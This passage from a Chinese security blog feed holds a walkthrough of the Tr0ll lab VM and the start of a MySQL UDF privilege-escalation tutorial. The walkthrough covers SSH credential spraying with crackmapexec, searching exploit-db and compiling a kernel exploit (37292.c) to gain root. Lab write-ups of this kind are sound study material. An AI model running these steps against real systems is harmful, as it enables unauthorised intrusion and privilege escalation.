class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ file roflmao </span><br><span class="line">roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ binwalk roflmao         </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)</span><br><span class="line"></span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ strings roflmao  </span><br><span class="line">/lib/ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line">printf</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.0</span><br><span class="line">PTRh</span><br><span class="line">[^_]</span><br><span class="line">Find address 0x0856BF to proceed</span><br><span class="line">;*2$&quot;</span><br><span class="line">GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rel.dyn</span><br><span class="line">.rel.plt</span><br><span class="line">.init</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.jcr</span><br><span class="line">.dynamic</span><br><span class="line">.got</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line">crtstuff.c</span><br><span class="line">__JCR_LIST__</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.6590</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">roflmao.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__JCR_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__x86.get_pc_thunk.bx</span><br><span class="line">data_start</span><br><span class="line">printf@@GLIBC_2.0</span><br><span class="line">_edata</span><br><span class="line">_fini</span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_start_main@@GLIBC_2.0</span><br><span class="line">__libc_csu_init</span><br><span class="line">_end</span><br><span class="line">_start</span><br><span class="line">_fp_hw</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">_init</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一个ELF32位的可执行文件,并且里面没隐藏东西，而且还有告诉了一个地址0x0856BF</p><p>访问一下发现有两个文件夹</p><pre><code class="lang-good_luck/which_one_lol.txt```">以及```this_folder_contains_the_password/Pass.txt</code></pre><p>一个是账号一个是密码，试试ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh 192.168.159.133 -u which_one_lol.txt -p Pass.txt --continue-on-success </span><br></pre></td></tr></table></figure><p>—continue-on-success参数用于保证当寻找到首个账号与密码的对应关系后继续碰撞</p><p>一次只能尝试5个？应该是SSH那边有安全措施，还好就没几个，再试一次就好了</p><p>然后又寄了，然后想着这个靶机开始那么的，额，你懂的，然后就试试Pass.txt作为密码</p><p>man what can i say<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ crackmapexec ssh 192.168.159.133 -u which_one_lol.txt -p 1.txt</span><br><span class="line">SSH         192.168.159.133 22     192.168.159.133  [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</span><br><span class="line">SSH         192.168.159.133 22     192.168.159.133  [-] maleus:Pass.txt Authentication failed.</span><br><span class="line">SSH         192.168.159.133 22     192.168.159.133  [-] ps-aux:Pass.txt Authentication failed.</span><br><span class="line">SSH         192.168.159.133 22     192.168.159.133  [-] felux:Pass.txt Authentication failed.</span><br><span class="line">SSH         192.168.159.133 22     192.168.159.133  [+] overflow:Pass.txt </span><br></pre></td></tr></table></figure></p><p>ssh链接</p><p>id看身份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)</span><br></pre></td></tr></table></figure><p>过了一会自己就给我退了，这不对吧老弟</p><p>应该是有什么清理任务的，，</p><p>找找</p><p>find / -name cronlog 2&gt;/dev/null（后面这个是将错误信息扔掉，在搜索的时候，由于可能因为权限不被允许等原因，无法查找到结果，会有很多报错，因此添加2&gt;/dev/null方便查看结果</p><p>cronlog是跟定时任务有关的日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find / -name cronlog 2&gt;/dev/null</span><br><span class="line">/var/log/cronlog</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">overflow@troll:/$ </span><br><span class="line">overflow@troll:/$ cat /var/log/cronlog</span><br><span class="line">*/2 * * * * cleaner.py</span><br></pre></td></tr></table></figure><p>进去以后，好好好就你小子是吧</p><p>我试了试vim搞</p><p>但是文件是只读的，（所以我看的那个wp是怎么搞进去的，疑惑脸</p><p>name -u看一眼系统</p><p>linux 3.13.0</p><p>ok搜了一下37292.c和37293.c</p><p>经典<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ searchsploit linux 3.13.0</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Alienvault Open Source SIEM (OSSIM) &lt; 4.7.0 - &#x27;get_license&#x27; | linux/remote/42697.rb</span><br><span class="line">Alienvault Open Source SIEM (OSSIM) &lt; 4.7.0 - av-centerd &#x27;g | linux/remote/33805.pl</span><br><span class="line">Alienvault Open Source SIEM (OSSIM) &lt; 4.8.0 - &#x27;get_file&#x27; In | linux/remote/42695.rb</span><br><span class="line">AppArmor securityfs &lt; 4.8 - &#x27;aa_fs_seq_hash_show&#x27; Reference | linux/dos/40181.c</span><br><span class="line">CyberArk &lt; 10 - Memory Disclosure                           | linux/remote/44829.py</span><br><span class="line">CyberArk Password Vault &lt; 9.7 / &lt; 10 - Memory Disclosure    | linux/dos/44428.txt</span><br><span class="line">Dell EMC RecoverPoint &lt; 5.1.2 - Local Root Command Executio | linux/local/44920.txt</span><br><span class="line">Dell EMC RecoverPoint &lt; 5.1.2 - Local Root Command Executio | linux/local/44920.txt</span><br><span class="line">Dell EMC RecoverPoint &lt; 5.1.2 - Remote Root Command Executi | linux/remote/44921.txt</span><br><span class="line">Dell EMC RecoverPoint &lt; 5.1.2 - Remote Root Command Executi | linux/remote/44921.txt</span><br><span class="line">Dell EMC RecoverPoint boxmgmt CLI &lt; 5.1.2 - Arbitrary File  | linux/local/44688.txt</span><br><span class="line">DenyAll WAF &lt; 6.3.0 - Remote Code Execution (Metasploit)    | linux/webapps/42769.rb</span><br><span class="line">Exim &lt; 4.86.2 - Local Privilege Escalation                  | linux/local/39549.txt</span><br><span class="line">Exim &lt; 4.90.1 - &#x27;base64d&#x27; Remote Code Execution             | linux/remote/44571.py</span><br><span class="line">Gnome Web (Epiphany) &lt; 3.28.2.1 - Denial of Service         | linux/dos/44857.html</span><br><span class="line">Jfrog Artifactory &lt; 4.16 - Arbitrary File Upload / Remote C | linux/webapps/44543.txt</span><br><span class="line">KDE libkhtml 3.5 &lt; 4.2.0 - Unhandled HTML Parse Exception   | linux/dos/2954.html</span><br><span class="line">LibreOffice &lt; 6.0.1 - &#x27;=WEBSERVICE&#x27; Remote Arbitrary File D | linux/remote/44022.md</span><br><span class="line">Linux &lt; 4.14.103 / &lt; 4.19.25 - Out-of-Bounds Read and Write | linux/dos/46477.txt</span><br><span class="line">Linux &lt; 4.16.9 / &lt; 4.14.41 - 4-byte Infoleak via Uninitiali | linux/dos/44641.c</span><br><span class="line">Linux &lt; 4.20.14 - Virtual Address 0 is Mappable via Privile | linux/dos/46502.txt</span><br><span class="line">Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Local Privil | solaris/local/15962.c</span><br><span class="line">Linux Kernel 2.6.19 &lt; 5.9 - &#x27;Netfilter Local Privilege Esca | linux/local/50135.c</span><br><span class="line">Linux Kernel 3.11 &lt; 4.8 0 - &#x27;SO_SNDBUFFORCE&#x27; / &#x27;SO_RCVBUFFO | linux/local/41995.c</span><br><span class="line">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) | linux/local/37292.c</span><br><span class="line">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) | linux/local/37293.txt</span><br><span class="line">Linux Kernel 3.14-rc1 &lt; 3.15-rc4 (x64) - Raw Mode PTY Echo  | linux_x86-64/local/33516.c</span><br><span class="line">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#x27;CONFI | linux_x86-64/local/31347.c</span><br><span class="line">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.10) - &#x27;CONFIG_X86_X32&#x27; | linux/local/31346.c</span><br><span class="line">Linux Kernel 3.4 &lt; 3.13.2 - recvmmsg x32 compat (PoC)       | linux/dos/31305.c</span><br><span class="line">Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-A | linux/dos/43234.c</span><br><span class="line">Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation  | linux/local/41886.c</span><br><span class="line">Linux Kernel &lt; 3.16.1 - &#x27;Remount FUSE&#x27; Local Privilege Esca | linux/local/34923.c</span><br><span class="line">Linux Kernel &lt; 3.16.39 (Debian 8 x64) - &#x27;inotfiy&#x27; Local Pri | linux_x86-64/local/44302.c</span><br><span class="line">Linux Kernel &lt; 4.10.13 - &#x27;keyctl_set_reqkey_keyring&#x27; Local  | linux/dos/42136.c</span><br><span class="line">Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalatio | linux/local/43345.c</span><br><span class="line">Linux Kernel &lt; 4.11.8 - &#x27;mq_notify: double sock_put()&#x27; Loca | linux/local/45553.c</span><br><span class="line">Linux Kernel &lt; 4.13.1 - BlueTooth Buffer Overflow (PoC)     | linux/dos/42762.txt</span><br><span class="line">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Pr | linux/local/45010.c</span><br><span class="line">Linux Kernel &lt; 4.14.rc3 - Local Denial of Service           | linux/dos/42932.c</span><br><span class="line">Linux Kernel &lt; 4.15.4 - &#x27;show_floppy&#x27; KASLR Address Leak    | linux/local/44325.c</span><br><span class="line">Linux Kernel &lt; 4.16.11 - &#x27;ext4_read_inline_data()&#x27; Memory C | linux/dos/44832.txt</span><br><span class="line">Linux Kernel &lt; 4.17-rc1 - &#x27;AF_LLC&#x27; Double Free              | linux/dos/44579.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege | linux/local/44298.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;netfilter tar | linux_x86-64/local/44300.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - | linux/local/43418.c</span><br><span class="line">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux M | linux/local/47169.c</span><br><span class="line">Linux Kernel &lt; 4.5.1 - Off-By-One (PoC)                     | linux/dos/44301.c</span><br><span class="line">Logpoint &lt; 5.6.4 - Root Remote Code Execution               | linux/remote/42158.py</span><br><span class="line">MatrixSSL &lt; 4.0.2 - Stack Buffer Overflow Verifying x.509 C | linux/dos/46435.txt</span><br><span class="line">MatrixSSL &lt; 4.0.2 - Stack Buffer Overflow Verifying x.509 C | linux/dos/46435.txt</span><br><span class="line">MiniDVBLinux &lt;=5.4  - Config Download Exploit               | hardware/remote/51091.txt</span><br><span class="line">Nagios &lt; 4.2.2 - Arbitrary Code Execution                   | linux/remote/40920.py</span><br><span class="line">Nagios &lt; 4.2.4 - Local Privilege Escalation                 | linux/local/40921.sh</span><br><span class="line">NfSen &lt; 1.3.7 / AlienVault OSSIM &lt; 5.3.6 - Local Privilege  | linux/local/42305.txt</span><br><span class="line">OpenSSH 2.3 &lt; 7.7 - Username Enumeration                    | linux/remote/45233.py</span><br><span class="line">OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)              | linux/remote/45210.py</span><br><span class="line">OpenSSH &lt; 6.6 SFTP (x64) - Command Execution                | linux_x86-64/remote/45000.c</span><br><span class="line">OpenSSH &lt; 6.6 SFTP - Command Execution                      | linux/remote/45001.py</span><br><span class="line">OpenSSH &lt; 7.4 - &#x27;UsePrivilegeSeparation Disabled&#x27; Forwarded | linux/local/40962.txt</span><br><span class="line">OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading    | linux/remote/40963.txt</span><br><span class="line">OpenSSH &lt; 7.7 - User Enumeration (2)                        | linux/remote/45939.py</span><br><span class="line">Oracle MySQL &lt; 5.1.49 - &#x27;DDL&#x27; Statements Denial of Service  | linux/dos/34522.txt</span><br><span class="line">Oracle MySQL &lt; 5.1.49 - Malformed &#x27;BINLOG&#x27; Arguments Denial | linux/dos/34521.txt</span><br><span class="line">Oracle VM VirtualBox &lt; 5.0.32 / &lt; 5.1.14 - Local Privilege  | linux/local/41196.txt</span><br><span class="line">Oracle WebCenter FatWire Content Server &lt; 7 - Improper Acce | linux/webapps/44757.txt</span><br><span class="line">PHP &lt; 4.4.5/5.2.1 - &#x27;shmop&#x27; Local Code Execution            | linux/local/3426.php</span><br><span class="line">PHP &lt; 4.4.5/5.2.1 - &#x27;shmop&#x27; SSL RSA Private-Key Disclosure  | linux/local/3427.php</span><br><span class="line">PHP &lt; 4.4.5/5.2.1 - &#x27;_SESSION unset()&#x27; Local Overflow       | linux/local/3571.php</span><br><span class="line">PHP &lt; 4.4.5/5.2.1 - &#x27;_SESSION&#x27; Deserialization Overwrite    | linux/local/3572.php</span><br><span class="line">Pi-hole &lt; 4.4 - Authenticated Remote Code Execution         | linux/webapps/48442.py</span><br><span class="line">Pi-hole &lt; 4.4 - Authenticated Remote Code Execution / Privi | linux/webapps/48443.py</span><br><span class="line">Redis-cli &lt; 5.0 - Buffer Overflow (PoC)                     | linux/local/44904.py</span><br><span class="line">RPi Cam Control &lt; 6.4.25 - &#x27;preview.php&#x27; Remote Command Exe | linux/webapps/45361.py</span><br><span class="line">runc &lt; 1.0-rc6 (Docker &lt; 18.09.2) - Container Breakout (1)  | linux/local/46359.md</span><br><span class="line">runc &lt; 1.0-rc6 (Docker &lt; 18.09.2) - Container Breakout (2)  | linux/local/46369.md</span><br><span class="line">Samba 3.5.0 &lt; 4.4.14/4.5.10/4.6.4 - &#x27;is_known_pipename()&#x27; A | linux/remote/42084.rb</span><br><span class="line">SAP B2B / B2C CRM 2.x &lt; 4.x - Local File Inclusion          | linux/webapps/44655.txt</span><br><span class="line">Serv-U FTP Server &lt; 15.1.7 - Local Privilege Escalation (1) | linux/local/47009.c</span><br><span class="line">SixApart MovableType &lt; 5.2.12 - Storable Perl Code Executio | linux/webapps/41697.rb</span><br><span class="line">Splunk &lt; 7.0.1 - Information Disclosure                     | linux/webapps/44865.txt</span><br><span class="line">systemd (systemd-tmpfiles) &lt; 236 - &#x27;fs.protected_hardlinks= | linux/local/43935.txt</span><br><span class="line">Tenable Appliance &lt; 4.5 - Root Remote Code Execution        | linux/remote/41892.sh</span><br><span class="line">Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Nam | linux/local/41760.txt</span><br><span class="line">UCOPIA Wireless Appliance &lt; 5.1 (Captive Portal) - Root Rem | linux/remote/42949.txt</span><br><span class="line">UCOPIA Wireless Appliance &lt; 5.1.8 - Local Privilege Escalat | linux/local/42936.md</span><br><span class="line">UCOPIA Wireless Appliance &lt; 5.1.8 - Restricted Shell Escape | linux/local/42937.md</span><br><span class="line">Vim &lt; 8.1.1365 / Neovim &lt; 0.3.6 - Arbitrary Code Execution  | linux/local/46973.md</span><br><span class="line">Virtualmin &lt; 3.703 - Multiple Local/Remote Vulnerabilities  | linux/remote/9143.txt</span><br><span class="line">WordPress Core &lt; 4.7.4 - Unauthorized Password Reset        | linux/webapps/41963.txt</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ </span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ cp /usr/share/exploitdb/exploits/linux/local/37292.c .             </span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ls</span><br><span class="line">1.cer    40974.py                  get-pip.py  Pass.txt  vacation           zy.raw</span><br><span class="line">1.txt    file.None.0x81c751a0.dat  LinEnum     reports   volatility3</span><br><span class="line">37292.c  file.None.0x821231b8.dat  nuclei      roflmao   which_one_lol.txt</span><br><span class="line">                                                                             </span><br></pre></td></tr></table></figure><br>找，复制，看一气呵成，</p><p>在被攻击机那边进入tmp，不然你下不了东西，会一直报错权限不够，</p><p>攻击机起一个python服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">py3</span><br><span class="line">python -m http.server 5555</span><br><span class="line"></span><br><span class="line">py2</span><br><span class="line">python2 -m SimpleHTTPServer 5555   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从另一边wget下载，编译成可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o huanghong</span><br></pre></td></tr></table></figure><p>运行，id<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ gcc 37292.c -o huanghong</span><br><span class="line">$ ls</span><br><span class="line">37292.c  huanghong</span><br><span class="line">$ ./huanghong</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1002(overflow)</span><br><span class="line"># ls</span><br><span class="line">37292.c  huanghong</span><br><span class="line"># cd /root</span><br><span class="line"># ls</span><br><span class="line">proof.txt</span><br><span class="line"># cat proof.txt</span><br><span class="line">Good job, you did it! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">702a8c18d29c6f3ca0d99ef5712bfbdc</span><br><span class="line">                                                                               </span><br><span class="line">Broadcast Message from root@trol                                               </span><br><span class="line">        (somewhere) at 5:15 ...                                                </span><br><span class="line">                                                                               </span><br><span class="line">TIMES UP LOL!                     </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>收工</p><p><del>所以我还是疑惑那哥们是怎么在没权限情况下搞定vim的</del></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Tr0ll </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql提权</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8828%E6%97%A5-mysql%E7%9A%84udf%E6%8F%90%E6%9D%83/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8828%E6%97%A5-mysql%E7%9A%84udf%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>mysql的udf提权</p><h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><ul><li>已经获得mysql数据库的控制权限（即已经知道mysql的数据库账号密码<br>，但是不知道数据库所在服务器的权限，并且可以远程连接数据库</li><li>mysql具有写入文件的权力即<code>show global variables like&#39;%secure%&#39;</code>为空<h2 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h2></li><li>在拿到mysql权限的情况下，但是没拿到mysql所在服务器的权限，<br>通过在mysql提权，将mysql权限提升到操作系统权限</li></ul><p>（mysql提权获得的权限和mysql所在的服务武器登陆的账号权限<br>相关，如果是普通用户权限启动的mysql那就是普通用户权限<br>但是如果以管理员权限就是管理员权限的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>查看mysql是否具有读写的权限</p><ul><li>secure_file_priv值为NULL，说明不允许导入导出</li><li>secure_file_priv值为/tmp/,说明mysql的导入导出之限制在/tmp/目录下</li><li>secure_file_priv值为空说明允许导入导出</li></ul><p>这是不允许的<br><img src="https://pic.imgdb.cn/item/667e79d0d9c307b7e9760312.png" alt=""></p><p>这是允许输入输出的<br><img src="https://pic.imgdb.cn/item/667e79d0d9c307b7e976033a.png" alt=""></p><p>如果secure_file_priv的值不是的话，我们可以在mysql/my.ini中查看时候有更改secure_file_priv的参数为’’然后重启<br>mysql和apache服务即可生效</p><h2 id="上传动态链接库"><a href="#上传动态链接库" class="headerlink" title="上传动态链接库"></a>上传动态链接库</h2><p>动态链接库就是实现共享函数库的一种方式，在windows下叫dll，在linux环境下就是so，我们要把它放到固定的一些目录中</p><ul><li>在mysql&gt;5.1中,udf.dll必须在mysql的bin\plugin文件夹下，plugin文件夹默认不存在需要创建</li><li>mysql&lt;5.1</li><li><ul><li>如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。</li><li>如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</li></ul></li></ul><p>我已经创建了所以直接使用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;plugin%&quot;;</span><br></pre></td></tr></table></figure><br>查看位置</p><p>然后使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version_compile_os.@@version_compile_machine</span><br></pre></td></tr></table></figure><p>查看当前数据库以及操作系统的架构</p><p>在linux中我们需要编写一个udf.cpp的文件在执行编译的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;mysql.h&gt;</span><br><span class="line"> extern &quot;C&quot; long long testadd(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)</span><br><span class="line">&#123;</span><br><span class="line">int a = *((long long *)args-&gt;args[0]);</span><br><span class="line">int b = *((long long *)args-&gt;args[1]);</span><br><span class="line">return a + b;</span><br><span class="line">&#125;</span><br><span class="line">extern 